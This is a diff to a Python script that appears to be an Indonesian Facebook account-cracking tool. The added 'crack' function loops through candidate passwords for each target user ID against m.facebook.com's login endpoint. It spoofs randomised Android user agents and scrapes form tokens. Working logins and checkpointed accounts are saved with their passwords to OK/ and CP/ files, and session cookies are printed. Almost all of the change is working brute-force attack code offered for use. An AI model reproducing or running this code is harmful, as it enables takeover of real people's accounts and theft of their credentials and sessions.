@@ -1066,7 +1066,7 @@ def passwrd():
 					for xpwd in pwnya:
 						pwv.append(xpwd)
 				else:pass
-				pool.submit(reguler,idf,pwv,awal)
+				pool.submit(crack,idf,pwv)
 				
 		print('')
 	Console().print(Panel(f'[bold green]Crack Telah Selesai,Jangan lupa Sholat Kawan',subtitle="╭───", subtitle_align="left",title=f"[bold green]Cek Opsi",width=80,style=f"{color_panel}"))
@@ -1080,6 +1080,49 @@ def passwrd():
 		time.sleep(1)
 		exit()
 
+
+#--------------------[ METODE-MOBILE ]-----------------#
+def crack(idf,pwv):
+	global loop,ok,cp
+	bi = random.choice(['\33[m'])
+	pers = loop*100/len(id2)
+	fff = '%'
+	prog.update(des,description=f'[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
+	prog.advance(des)
+	rr = random.randint
+	Xshin = [f'Mozilla/5.0 (Linux; Android {str(rr(1,14))}; SM-G780G Build/SP1A.210812.016; wv)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(77,150))}.0{str(rr(4000,4280))}.{str(rr(70,199))} Mobile Safari/537.36[FB_IAB/FB4A; FBAV/397.0.0.23.404;']
+	ua = random.choice(Xshin)
+	ses = requests.Session()
+	for pw in pwv:
+		try:
+			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=1138256180423492&kid_directed_site=0&app_id=1138256180423492&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D1138256180423492%26display%3Dpage%26redirect_uri%3Dhttps%253A%252F%252Faccounts.shopify.com%252Flogin%252Fexternal%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%26state%3Dc2f75de03d88da0a9d730aba318d12dd6bc357b6d7798530%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De0590b7c-c4cc-4b66-b419-14083139e4c3%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.shopify.com%2Flogin%2Fexternal%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dc2f75de03d88da0a9d730aba318d12dd6bc357b6d7798530%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
+			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v13.0/dialog/oauth?app_id=799063067916842&cbt=1697315405849&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df107332bd16fa34%26domain%3Dwww.digimap.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.digimap.co.id%252Ff9dddded8d1374%26relation%3Dopener&client_id=799063067916842&display=touch&domain=www.digimap.co.id&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fwww.digimap.co.id%2Flogin&locale=en_US&logger_id=f81df0319ce4dc&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df34290959a6d4cc%26domain%3Dwww.digimap.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.digimap.co.id%252Ff9dddded8d1374%26relation%3Dopener%26frame%3Df34154227dfa4&response_type=token%2Csigned_request%2Cgraph_domain&scope=public_profile%2Cemail&sdk=joey&version=v13.0&refsrc=deprecated&ret=login&fbapp_pres=0&tp=unspecified","flow":"login_no_pin","pass":pw,}
+			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
+			koki+=' m_pixel_ratio=2.625; wd=412x756'
+			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=799063067916842&kid_directed_site=0&app_id=799063067916842&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fapp_id%3D799063067916842%26cbt%3D1697315405849%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df107332bd16fa34%2526domain%253Dwww.digimap.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.digimap.co.id%25252Ff9dddded8d1374%2526relation%253Dopener%26client_id%3D799063067916842%26display%3Dtouch%26domain%3Dwww.digimap.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.digimap.co.id%252Flogin%26locale%3Den_US%26logger_id%3Df81df0319ce4dc%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df34290959a6d4cc%2526domain%253Dwww.digimap.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.digimap.co.id%25252Ff9dddded8d1374%2526relation%253Dopener%2526frame%253Df34154227dfa4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv13.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df34290959a6d4cc%26domain%3Dwww.digimap.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.digimap.co.id%252Ff9dddded8d1374%26relation%3Dopener%26frame%3Df34154227dfa4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
+			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
+			if "checkpoint" in po.cookies.get_dict().keys():
+				print(f'{K}   Rudal {cpc}')
+				print(f'\râ”œâ”€â”€{K}{idf}|{pw}    \n{M}{ua}           \n')
+				open('CP/'+cpc,'a').write(idf+' â€¢ '+pw+'\n')
+				akun.append(idf+' â€¢ '+pw)
+				cp+=1
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				ok+=1
+				coki=po.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				print(f'{H}   Rudal {okc}')
+				print(f'\râ”œâ”€â”€ {H}{idf}|{pw} \n{P}â””â”€â”€ {H}{kuki}\n{H}{ua}{P}\n')
+				open('OK/'+okc,'a').write(idf+' â€¢ '+pw+'\n')
+				break
+				
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(31)
+	loop+=1
 #--------------------[ METODE reguler ]-----------------#
 def reguler(idf,pwv,awal):
 	global loop,ok,cp
